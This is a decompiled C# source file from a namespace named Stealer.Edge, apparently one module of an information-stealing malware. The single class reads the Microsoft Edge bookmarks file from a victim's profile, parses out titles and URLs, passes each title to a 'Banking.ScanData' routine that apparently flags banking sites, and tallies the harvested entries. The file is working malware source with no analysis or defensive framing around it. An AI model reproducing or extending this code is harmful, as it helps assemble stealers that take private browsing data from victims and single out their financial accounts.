using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Stealer.Chromium;

namespace Stealer.Edge
{
	// Token: 0x0200002E RID: 46
	internal sealed class Bookmarks
	{
		// Token: 0x060000D0 RID: 208 RVA: 0x0000758C File Offset: 0x0000578C
		public static List<Bookmark> Get(string sBookmarks)
		{
			List<Bookmark> result;
			try
			{
				List<Bookmark> list = new List<Bookmark>();
				if (!File.Exists(sBookmarks))
				{
					result = list;
				}
				else
				{
					foreach (string text in Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(sBookmarks, Encoding.UTF8), "      \"bookmark_bar\": {")[1], "      \"other\": {")[0], "},"))
					{
						if (text.Contains("\"name\": \"") && text.Contains("\"type\": \"url\",") && text.Contains("\"url\": \"http"))
						{
							int num = 0;
							foreach (string data in Regex.Split(text, Parser.separator))
							{
								num++;
								Bookmark item = default(Bookmark);
								if (Parser.DetectTitle(data))
								{
									item.sTitle = Parser.Get(text, num);
									item.sUrl = Parser.Get(text, num + 3);
									if (!string.IsNullOrEmpty(item.sTitle) && !string.IsNullOrEmpty(item.sUrl) && !item.sUrl.Contains("Failed to parse url"))
									{
										Banking.ScanData(item.sTitle);
										Counter.Bookmarks++;
										list.Add(item);
									}
								}
							}
						}
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Bookmark>();
			}
			return result;
		}
	}
}
